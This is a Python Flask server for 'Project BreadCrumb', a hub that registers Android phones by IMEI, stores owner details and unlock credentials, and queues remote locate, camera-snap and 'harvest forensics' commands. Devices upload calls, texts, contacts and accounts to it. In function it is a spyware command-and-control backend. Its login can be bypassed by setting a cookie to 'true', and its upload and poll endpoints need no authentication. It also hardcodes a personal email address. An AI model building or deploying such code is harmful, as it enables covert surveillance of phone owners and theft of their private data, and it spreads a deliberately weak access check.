import os
import sqlite3
from flask import Flask, render_template_string, request, redirect, url_for, jsonify

app = Flask(__name__)
CLOUD_DB = "cloud_relay.db"

MASTER_USER = os.environ.get("BREAD_ADMIN_USER")
MASTER_PASS = os.environ.get("BREAD_ADMIN_PASS")

def init_cloud_db():
    conn = sqlite3.connect(CLOUD_DB)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS registered_devices (
            imei TEXT PRIMARY KEY,
            make_model TEXT,
            owner_name TEXT,
            owner_email TEXT,
            unlock_credentials TEXT,
            verified INTEGER,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            status TEXT,
            device_profile TEXT DEFAULT 'Standard Android'
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS pending_commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            imei TEXT,
            command_type TEXT,
            payload TEXT,
            status TEXT DEFAULT 'PENDING',
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS forensic_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            imei TEXT,
            data_type TEXT,
            content TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS media_vault (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            imei TEXT,
            filename TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

init_cloud_db()

FORENSIC_ADMIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Project BreadCrumb - Forensic & Dispatch Hub</title>
    <style>
        :root { --bg: #121212; --card: #1e1e1e; --primary: #bb86fc; --text: #e0e0e0; --accent: #03dac6; --danger: #cf6679; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 15px; }
        .container { max-width: 1100px; margin: auto; }
        .card { background: var(--card); border-radius: 8px; padding: 20px; margin-bottom: 20px; border: 1px solid #333; }
        h2, h3 { color: var(--primary); margin-top: 0; }
        .badge { background: #333; color: var(--accent); padding: 3px 8px; border-radius: 4px; font-size: 11px; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 12px; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #333; }
        th { color: var(--accent); }
        pre { background: #000; padding: 10px; border-radius: 4px; color: #03dac6; max-height: 150px; overflow-y: auto; font-size: 11px; }
        .btn { background: var(--primary); color: #000; border: none; padding: 6px 10px; border-radius: 4px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; margin: 2px; font-size: 11px; }
        .btn-danger { background: var(--danger); color: #fff; }
        .btn-accent { background: var(--accent); color: #000; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h2>Project BreadCrumb Forensic Vault</h2>
            <p>Master Dispatch & Evidence Extraction Hub</p>
            <a href="/logout" class="btn btn-danger" style="float: right; margin-top: -45px;">Logout</a>
        </div>

        <div class="card">
            <h3>Registered Protected Handsets</h3>
            <table>
                <tr>
                    <th>IMEI / ID</th>
                    <th>Hardware & Profile</th>
                    <th>Owner</th>
                    <th>Status</th>
                    <th>Actions & Forensic Commands</th>
                </tr>
                {% for dev in devices %}
                <tr>
                    <td><code>{{ dev[0] }}</code></td>
                    <td><b>{{ dev[1] }}</b><br><span style="color: #888; font-size: 10px;">{{ dev[8] }}</span></td>
                    <td>{{ dev[2] }}<br><span style="color: #888; font-size: 10px;">{{ dev[3] }}</span></td>
                    <td style="color: var(--accent); font-weight: bold;">{{ dev[7] }}</td>
                    <td>
                        <form method="POST" action="/api/queue-command" style="display:inline;">
                            <input type="hidden" name="imei" value="{{ dev[0] }}">
                            <input type="hidden" name="command" value="LOCATE">
                            <button type="submit" class="btn btn-accent">📍 Locate</button>
                        </form>
                        <form method="POST" action="/api/queue-command" style="display:inline;">
                            <input type="hidden" name="imei" value="{{ dev[0] }}">
                            <input type="hidden" name="command" value="HARVEST_FORENSICS">
                            <button type="submit" class="btn">🕵️ Harvest Logs</button>
                        </form>
                        <form method="POST" action="/api/queue-command" style="display:inline;">
                            <input type="hidden" name="imei" value="{{ dev[0] }}">
                            <input type="hidden" name="command" value="SNAP">
                            <button type="submit" class="btn">📸 Snap</button>
                        </form>
                        <form method="POST" action="/api/queue-command" style="display:inline;">
                            <input type="hidden" name="imei" value="{{ dev[0] }}">
                            <input type="hidden" name="command" value="ALARM">
                            <button type="submit" class="btn btn-danger">🚨 Alarm</button>
                        </form>
                    </td>
                </tr>
                {% else %}
                <tr><td colspan="5" style="text-align: center; color: #777;">No active devices synced.</td></tr>
                {% endfor %}
            </table>
        </div>

        <div class="card">
            <h3>Harvested Forensic Intelligence (Calls, Texts, Contacts, Accounts)</h3>
            <table>
                <tr>
                    <th>Timestamp</th>
                    <th>IMEI</th>
                    <th>Data Category</th>
                    <th>Extracted Content</th>
                </tr>
                {% for log in forensic_logs %}
                <tr>
                    <td>{{ log[4] }}</td>
                    <td><code>{{ log[1] }}</code></td>
                    <td><b>{{ log[2] }}</b></td>
                    <td><pre>{{ log[3] }}</pre></td>
                </tr>
                {% else %}
                <tr><td colspan="4" style="text-align: center; color: #777;">No forensic intelligence harvested yet. Click "Harvest Logs" above.</td></tr>
                {% endfor %}
            </table>
        </div>
    </div>
</body>
</html>
"""

LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><title>Master Login</title>
    <style>
        body { font-family: sans-serif; background: #121212; color: #e0e0e0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e1e1e; padding: 25px; border-radius: 8px; width: 300px; border: 1px solid #333; }
        input { width: 100%; padding: 10px; margin: 8px 0; border-radius: 4px; border: 1px solid #444; background: #000; color: #fff; box-sizing: border-box; }
        button { background: #bb86fc; color: #000; border: none; padding: 10px; border-radius: 4px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="card">
        <h2 style="color: #bb86fc; text-align: center; margin-top:0;">Master Auth</h2>
        {% if error %}<p style="color: #cf6679; font-size: 11px; text-align: center;">{{ error }}</p>{% endif %}
        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Access Portal</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def cloud_dashboard():
    if not MASTER_USER or not MASTER_PASS:
        return "<h3>[Security Error]: Master credentials not configured in environment variables.</h3>", 500

    if request.cookies.get("auth") != "true":
        if request.method == 'POST':
            if request.form.get("username") == MASTER_USER and request.form.get("password") == MASTER_PASS:
                resp = redirect(url_for('cloud_dashboard'))
                resp.set_cookie("auth", "true")
                return resp
            return render_template_string(LOGIN_TEMPLATE, error="Invalid Credentials")
        return render_template_string(LOGIN_TEMPLATE)

    conn = sqlite3.connect(CLOUD_DB)
    cursor = conn.cursor()
    cursor.execute("SELECT imei, make_model, owner_name, owner_email, unlock_credentials, verified, last_seen, status, device_profile FROM registered_devices")
    devices = cursor.fetchall()
    cursor.execute("SELECT id, imei, data_type, content, timestamp FROM forensic_logs ORDER BY timestamp DESC LIMIT 50")
    forensic_logs = cursor.fetchall()
    conn.close()

    return render_template_string(FORENSIC_ADMIN_TEMPLATE, devices=devices, forensic_logs=forensic_logs)

@app.route('/logout')
def logout():
    resp = redirect(url_for('cloud_dashboard'))
    resp.set_cookie("auth", "", expires=0)
    return resp

@app.route('/api/sync', methods=['POST'])
def api_sync():
    data = request.json or {}
    imei = data.get("imei")
    if not imei:
        return jsonify({"error": "Missing IMEI"}), 400

    conn = sqlite3.connect(CLOUD_DB)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO registered_devices (imei, make_model, owner_name, owner_email, unlock_credentials, verified, status, device_profile)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (
        imei,
        data.get("make_model", "Generic Android"),
        data.get("owner_name", "Master Operator"),
        data.get("owner_email", "jeanmichelleledeoux@gmail.com"),
        data.get("unlock_credentials", "Set"),
        data.get("verified", 1),
        data.get("status", "Online"),
        data.get("device_profile", "Termux Native")
    ))
    conn.commit()
    conn.close()
    return jsonify({"status": "synced"})

@app.route('/api/upload-forensics', methods=['POST'])
def upload_forensics():
    data = request.json or {}
    imei = data.get("imei")
    data_type = data.get("data_type")
    content = data.get("content")
    if not imei or not data_type:
        return jsonify({"error": "Missing parameters"}), 400

    conn = sqlite3.connect(CLOUD_DB)
    cursor = conn.cursor()
    cursor.execute("INSERT INTO forensic_logs (imei, data_type, content) VALUES (?, ?, ?)", (imei, data_type, content))
    conn.commit()
    conn.close()
    return jsonify({"status": "forensics_saved"})

@app.route('/api/queue-command', methods=['POST'])
def queue_command():
    if request.cookies.get("auth") != "true":
        return redirect(url_for('cloud_dashboard'))
    imei = request.form.get("imei")
    cmd = request.form.get("command")
    if imei and cmd:
        conn = sqlite3.connect(CLOUD_DB)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO pending_commands (imei, command_type) VALUES (?, ?)", (imei, cmd))
        conn.commit()
        conn.close()
    return redirect(url_for('cloud_dashboard'))

@app.route('/api/poll-commands', methods=['GET'])
def poll_commands():
    imei = request.args.get("imei")
    if not imei:
        return jsonify([])
    conn = sqlite3.connect(CLOUD_DB)
    cursor = conn.cursor()
    cursor.execute("SELECT id, command_type FROM pending_commands WHERE imei = ? AND status = 'PENDING'", (imei,))
    cmds = cursor.fetchall()
    if cmds:
        cmd_ids = [c[0] for c in cmds]
        cursor.execute(f"UPDATE pending_commands SET status = 'EXECUTED' WHERE id IN ({','.join(['?']*len(cmd_ids))})", tuple(cmd_ids))
        conn.commit()
    conn.close()
    return jsonify([{"id": c[0], "command": c[1]} for c in cmds])

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
